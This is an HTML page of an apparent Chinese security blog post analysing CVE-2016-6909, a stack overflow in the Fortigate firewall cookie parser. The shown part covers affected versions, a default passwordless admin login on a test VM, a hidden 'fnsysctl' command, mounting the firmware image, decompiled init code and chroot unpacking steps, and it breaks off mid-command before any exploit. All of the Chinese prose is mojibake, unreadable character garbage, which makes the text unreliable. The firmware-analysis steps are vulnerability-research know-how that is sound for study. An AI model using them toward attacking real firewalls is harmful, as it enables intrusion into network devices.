<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="ã‚ãŒã„ãŸå¤¢ã‚’æ¨ã¦ã¦æºã‚Œã‚‹ä»Šæ—¥ã¯çœ ã£ã¦èª¤é­”åŒ–ã›" />
  
  
  <title>
    
      ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´å¤ç°åŠç®€è¦åˆ†æ 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´å¤ç°åŠç®€è¦åˆ†æ</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
          2021-08-10 17:42:05
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                
                <span class="span--category">
                  <a href="/categories/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Linux/" title="Linux">
                    <b>#</b> Linux
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2text/" title="ret2text">
                    <b>#</b> ret2text
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ROP/" title="ROP">
                    <b>#</b> ROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="æ ˆæº¢å‡º">
                    <b>#</b> æ ˆæº¢å‡º
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2shellcode/" title="ret2shellcode">
                    <b>#</b> ret2shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/shellcode/" title="shellcode">
                    <b>#</b> shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Fortigate/" title="Fortigate">
                    <b>#</b> Fortigate
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>å½æˆ‘ç€ğŸ”¥äº†.jpg</p>
<span id="more"></span>

<blockquote>
<p>ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«*Nâ€¦.ç®€å•çš„ä¸€ä¸ªæ´ï¼Œæœ¬æ¥åº”è¯¥ä¸€å¤©å°±å¼„å¥½çš„ï¼Œæ„£æ˜¯å› ä¸ºå„ç§ç„å­¦é—®é¢˜åœ¨å…¬å¸æ‹—äº†åŠå‘¨â€¦.</p>
<p>è¿˜æ˜¯å› ä¸ºå¤ªèœäº†ï¼ˆæ¼ï¼‰</p>
</blockquote>
<h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>Fortigate ç³»åˆ—æ˜¯ Fortinetï¼ˆé£å¡”ï¼‰å…¬å¸æ——ä¸‹çš„é˜²ç«å¢™äº§å“ä¹‹ä¸€ï¼Œ2016å¹´ï¼ŒShadow Brokerså…¬å¼€äº†é»‘å®¢ç»„ç»‡<strong>Equation Group</strong>é’ˆå¯¹å„å¤§å‚å•†é˜²ç«å¢™çš„<a target="_blank" rel="noopener" href="https://musalbas.com/blog/2016/08/16/equation-group-firewall-operations-catalogue.html">æ¼æ´åˆ©ç”¨å·¥å…·</a>ï¼Œå­˜åœ¨äº Fortigate ä¸­çš„ä¸€ä¸ªéšè”½çš„æ ˆæº¢å‡ºæ¼æ´ä¹Ÿå°±æ­¤è¢«å¤§ç™½äºå¤©ä¸‹</p>
<p>åœ¨ <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6909">cve.mitre.org</a> ä¸Šå¯¹è¯¥æ¼æ´çš„è¯´æ˜å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>Buffer overflow in the Cookie parser in Fortinet FortiOS 4.x before 4.1.11, 4.2.x before 4.2.13, and 4.3.x before 4.3.9 and FortiSwitch before 3.4.3 allows remote attackers to execute arbitrary code via a crafted HTTP request, aka EGREGIOUSBLUNDER.</p>
</blockquote>
<p>ç¬”è€…ä»Šå¤©å°†å€ŸåŠ©å—å½±å“çš„ä¸€ä¸ªè™šæ‹Ÿæœºç‰ˆæœ¬ <strong>FGT_VM-v400-build0482</strong> æ¥åˆ†æè¯¥æ¼æ´</p>
<h2 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬"></a>æ¼æ´å½±å“ç‰ˆæœ¬</h2><p>Fortinet FortiOS 4.x &lt; 4.1.11, 4.2.x &lt; 4.2.13, 4.3.x &lt; 4.3.9ã€FortiSwitch &lt; 3.4.3</p>
<h2 id="ç™»å…¥-fortigate-VM"><a href="#ç™»å…¥-fortigate-VM" class="headerlink" title="ç™»å…¥ fortigate VM"></a>ç™»å…¥ fortigate VM</h2><p>é»˜è®¤è´¦æˆ·æ˜¯ <code>admin</code> ï¼Œæ— å¯†ç ï¼Œå¯ä»¥ç”¨äºæœ¬åœ°æµ‹è¯•</p>
<p><img src="https://i.loli.net/2021/08/13/7WNytbF5MGnsfVA.png" alt="image.png"></p>
<p>é€šå¸¸æƒ…å†µä¸‹é˜²ç«å¢™ä¸ä¼šç»™æˆ‘ä»¬æä¾› shellï¼Œè€Œæ˜¯<strong>ä»…</strong>æä¾›ä¸€ä¸ªç®€æ˜“ CLI ç•Œé¢ï¼Œåœ¨ä¸Šé¢æˆ‘ä»¬åªèƒ½ä½¿ç”¨å…¶æ‰€å†…ç½®æä¾›çš„å‡ ä¸ªåŠŸèƒ½</p>
<h2 id="åé—¨æŒ‡ä»¤"><a href="#åé—¨æŒ‡ä»¤" class="headerlink" title="åé—¨æŒ‡ä»¤"></a>åé—¨æŒ‡ä»¤</h2><p>ä»…é é˜²ç«å¢™çš„åŠŸèƒ½åŸºæœ¬ä¸Šä¸ç®—æ˜¯ä¸€ä¸ªå¯ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œå› æ­¤ fortigate VM CLI æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªéšè—æŒ‡ä»¤ <code>fnsysctl</code> ä»¥æ‰§è¡Œå…¶é™åˆ¶çš„è¯¸å¦‚ <code>ls</code> ç­‰çš„ä¸€äº›åŸºæœ¬å‘½ä»¤ï¼Œ<strong>ä¸åŒ…æ‹¬ shell</strong></p>
<blockquote>
<p>åç»­é€šè¿‡é€†å‘åˆ†ææˆ‘ä»¬å¯ä»¥å‘ç°å…¶ç¨‹åºæœ¬èº«é™åˆ¶äº†è¿‡æ»¤ shï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡ CLI ç›´æ¥æ‹¿åˆ°ä¸€ä¸ª shell</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/4G3kJV8vxMpqTsn.png" alt="image.png"></p>
<h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><h2 id="æ–‡ä»¶æå–"><a href="#æ–‡ä»¶æå–" class="headerlink" title="æ–‡ä»¶æå–"></a>æ–‡ä»¶æå–</h2><p>é¦–å…ˆå°†ç¡¬ç›˜é•œåƒ <code>fortios.vmdk</code> æŒ‚è½½åˆ° <code>/mnt</code> ç›®å½•ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/11/dsRm83O24UhATKj.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo fdisk -l</span></span><br><span class="line">...</span><br><span class="line">Device     Boot  Start     End Sectors  Size Id Type</span><br><span class="line">/dev/sdb1  *         1  262144  262144  128M 83 Linux</span><br><span class="line">/dev/sdb2       262145 4194304 3932160  1.9G 83 Linux</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /mnt/fortios</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/fortios</span></span><br></pre></td></tr></table></figure>


<p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½å¤Ÿåœ¨ <code>/mnt</code> ç›®å½•ä¸‹æŸ¥çœ‹ç£ç›˜ä¸­çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /mnt/fortios</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 23392</span><br><span class="line">drwxr-xr-x 3 root root     1024 Sep 20  2011 ./</span><br><span class="line">drwxr-xr-x 5 root root     4096 Aug 10 18:43 ../</span><br><span class="line">-rw-r--r-- 1 root root  5182591 Sep 20  2011 datafs.tar.gz</span><br><span class="line">-rw-r--r-- 1 root root      107 Sep 20  2011 extlinux.conf</span><br><span class="line">lrwxrwxrwx 1 root root       12 Sep 20  2011 flatkc -&gt; ./flatkc.smp</span><br><span class="line">-rw-r--r-- 1 root root      256 Sep 20  2011 flatkc.chk</span><br><span class="line">-rw-r--r-- 1 root root  1437300 Sep 20  2011 flatkc.nosmp</span><br><span class="line">-rw-r--r-- 1 root root  1501003 Sep 20  2011 flatkc.smp</span><br><span class="line">-r--r--r-- 1 root root    32256 Sep 20  2011 ldlinux.sys</span><br><span class="line">drwx------ 2 root root    12288 Sep 20  2011 lost+found/</span><br><span class="line">-rw-r--r-- 1 root root 15678360 Sep 20  2011 rootfs.gz</span><br><span class="line">-rw-r--r-- 1 root root      256 Sep 20  2011 rootfs.gz.chk</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç›´æ¥æŒ‚è½½é•œåƒæ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo modprobe nbd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount /dev/nbd1p1 /mnt</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸¤ä¸ªå†…æ ¸é•œåƒæ–‡ä»¶ <code>flatkc.smp</code> ä¸ <code>flatkc.nosmp</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file *</span></span><br><span class="line">datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size modulo 2^32 8724480</span><br><span class="line">extlinux.conf: ASCII text</span><br><span class="line">flatkc:        symbolic link to ./flatkc.smp</span><br><span class="line">flatkc.chk:    data</span><br><span class="line">flatkc.nosmp:  Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGA</span><br><span class="line">flatkc.smp:    Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGA</span><br><span class="line">ldlinux.sys:   SYSLINUX loader (version 4.00)</span><br><span class="line">lost+found:    directory</span><br><span class="line">rootfs.gz:     gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size modulo 2^32 19077120</span><br><span class="line">rootfs.gz.chk: data</span><br></pre></td></tr></table></figure>

<p>åœ¨ <code>extlinux.conf</code> ä¸­æŒ‡å®šäº†ä¸€äº›åŸºæœ¬é…ç½®ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿ <code>rootfs.gz</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> extlinux.conf</span> </span><br><span class="line">DEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz</span><br></pre></td></tr></table></figure>

<p>è§£å‹ <code>rootfs.gz</code> ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar xf ./rootfs.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 28216</span><br><span class="line">drwxr-xr-x 10 arttnba3 arttnba3     4096 Sep 20  2011 ./</span><br><span class="line">drwxr-xr-x  5 arttnba3 arttnba3     4096 Aug 10 18:52 ../</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3  8742988 Sep 20  2011 bin.tar.xz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data2/</span><br><span class="line">drwxr-xr-x  5 arttnba3 arttnba3     4096 Sep 20  2011 dev/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3        8 Sep 20  2011 etc -&gt; data/etc</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3        1 Sep 20  2011 fortidev -&gt; //</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 lib/</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3  4424536 Sep 20  2011 migadmin.tar.xz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 proc/</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3 15678360 Aug 10 18:54 rootfs.gz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 sbin/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 tmp/</span><br><span class="line">drwxr-xr-x  8 arttnba3 arttnba3     4096 Sep 20  2011 var/</span><br></pre></td></tr></table></figure>

<h2 id="å¯åŠ¨è¿‡ç¨‹åˆ†æ"><a href="#å¯åŠ¨è¿‡ç¨‹åˆ†æ" class="headerlink" title="å¯åŠ¨è¿‡ç¨‹åˆ†æ"></a>å¯åŠ¨è¿‡ç¨‹åˆ†æ</h2><h3 id="I-init-è¿›ç¨‹"><a href="#I-init-è¿›ç¨‹" class="headerlink" title="I. init è¿›ç¨‹"></a>I. init è¿›ç¨‹</h3><p>Linux å†…æ ¸è½½å…¥åä¼šå¯åŠ¨ç¬¬ä¸€ä¸ªè¿›ç¨‹ <code>init</code>ï¼Œç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶é€šå¸¸æ˜¯ <code>/sbin/init</code>ï¼Œè¯¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„ init æ–‡ä»¶è¾ƒå°ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…¶æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">2</span>]; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sub_8049254(<span class="string">&quot;bin&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    sub_8049254(<span class="string">&quot;migadmin&quot;</span>);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/xz&quot;</span>);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/ftar&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  execve(<span class="string">&quot;/bin/init&quot;</span>, argv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>sub_8049254()</code> æ ¸å¿ƒé€†å‘ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8049254</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x200</span>u, <span class="string">&quot;/%s.tar.xz&quot;</span>, a1);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  v1 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      waitpid(v1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      unlink(s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;/sbin/xz&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;--check=sha256&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;-d&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = s;</span><br><span class="line">    argv[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    execv(<span class="string">&quot;/sbin/xz&quot;</span>, argv);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(name, <span class="number">0x200</span>u, <span class="string">&quot;/%s.tar&quot;</span>, a1);</span><br><span class="line">  v3 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    waitpid(v3, &amp;v10, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !BYTE1(v10) )</span><br><span class="line">    &#123;</span><br><span class="line">      unlink(name);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;decompress init failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12[<span class="number">0</span>] = <span class="string">&quot;/sbin/ftar&quot;</span>;</span><br><span class="line">  v12[<span class="number">1</span>] = <span class="string">&quot;-xf&quot;</span>;</span><br><span class="line">  v12[<span class="number">2</span>] = name;</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  execv(<span class="string">&quot;/sbin/ftar&quot;</span>, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•… init è¿›ç¨‹åˆ†æå¦‚ä¸‹ï¼š</p>
<ul>
<li>æ£€æŸ¥ <code>/bin.tar.xz</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/xz --check=sha256 -d /bin.tar.xz</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/bin.tar.xz</code>ï¼Œä¹‹åæ£€æŸ¥ <code>/bin.tar</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/ftar -xf /bin.tar</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/bin.tar</code></li>
<li>ä¸Šä¸€æ­¥æˆåŠŸåæ£€æŸ¥ <code>/migadmin.tar.xz</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/xz --check=sha256 -d /migadmin.tar.xz</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/migadmin.tar.xz</code>ï¼Œä¹‹åæ£€æŸ¥ <code>/migadmin.tar</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/ftar -xf /migadmin.tar</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/migadmin.tar</code></li>
<li>åˆ é™¤ <code>/sbin/xz</code></li>
<li>åˆ é™¤ <code>/sbin/ftar</code></li>
<li>æ‰§è¡Œ <code>/bin/init</code></li>
</ul>
<p>ç”±äº <code>ftar</code> ä¸ <code>xz</code> éƒ½æŒ‡å®šäº†è°ƒç”¨çš„åº“çš„ç›®å½•å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/11/4exwH7Pkgh5JdGE.png" alt="image.png"></p>
<p>æ•…éœ€è¦é€šè¿‡åˆ‡æ¢æ ¹ç›®å½•æ‰§è¡Œè¿›è¡Œè§£å‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . 